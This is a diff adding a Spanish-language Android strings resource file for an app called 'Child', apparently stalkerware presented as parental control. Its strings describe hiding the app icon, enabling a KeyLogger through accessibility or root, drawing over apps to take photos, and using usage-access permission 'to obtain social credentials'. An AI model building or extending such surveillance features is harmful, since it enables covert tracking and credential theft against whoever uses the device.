@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Child</string>
+    <string name="login_hint_user">Correo</string>
+    <string name="login_hint_passw">Contraseña</string>
+    <string name="login_btn_sign_in">INGRESAR</string>
+    <string name="login_success">Inicio de sesión exitoso</string>
+    <string name="login_failed_try_again_later">Error al iniciar sesión, inténtelo más tarde</string>
+    <string name="login_failed">Error de inicio de sesión</string>
+    <string name="logging_in">Iniciando sesión</string>
+    <string name="ready_to_continue">Éxito de inicio de sesión, todo listo para continuar.</string>
+    <string name="hide_app">ESCONDER APP</string>
+    <string name="checking_root">Comprobando la raíz y habilitando la accesibilidad de KeyLogger</string>
+    <string name="msg_dialog_enable_keylogger">Root no encontrado, habilite la accesibilidad de KeyLogger en  \"ajustes - accesibilidad - servicios - accesibilidad child\"</string>
+    <string name="enable_keylogger_success">Acceso exitoso a KeyLogger</string>
+    <string name="accessibility_service_label">Accesibilidad child</string>
+    <string name="accessibility_service_description">Accesibilidad child permite que los usuarios impiden, o limitan el acceso al manejo de los mismos, o a su contenido a menores de edad.</string>
+    <string name="go_to_setting">Ir a ajustes</string>
+    <string name="title_dialog">Mensaje</string>
+    <string name="msg_dialog_enable_overdraw">Debes activar el permiso de \"dibujar sobre otras aplicaciones\" para poder tomar fotos.</string>
+    <string name="msg_dialog_enable_usage_stats">Necesita activar el permiso de \"Aplicaciones con permiso de acceso de uso\" para obtener credenciales sociales.</string>
+    <string name="msg_dialog_enable_accessibility_service">Debe habilitar el servicio de accesibilidad para que la aplicación funcione correctamente.</string>
+    <string name="enable_service">HABILITAR LA ACCESIBILIDAD DEL SERVICIO</string>
+    <string name="enable_overdraw">HABILITAR DIBUJAR SOBRE OTRAS APPS</string>
+    <string name="enable_usage_stats">HABILITAR PERMISO DE ACCESO DE USO</string>
+    <string name="address_not_found">Dirección no encontrada</string>
+    <string name="hiding">Ocultando…</string>
+    <string name="permission_request">Solicitud de permiso</string>
+    <string name="message_permission">Se requiere permiso para leer contactos, ubicación, grabar audio, leer el estado del teléfono, recibir mensajes, cámara y almacenamiento de escritura para esta aplicación. ¿Quieres intentarlo de nuevo?</string>
+    <string name="message_permission_never_ask_again">Algunos permisos fueron denegados, sin ellos la aplicación no funcionará correctamente. Para activarlos debes ir a \"Ajustes - aplicaciones - child - permisos\" y activar los permisos correspondientes. ¿Quieres activarlos ahora?</string>
+</resources>
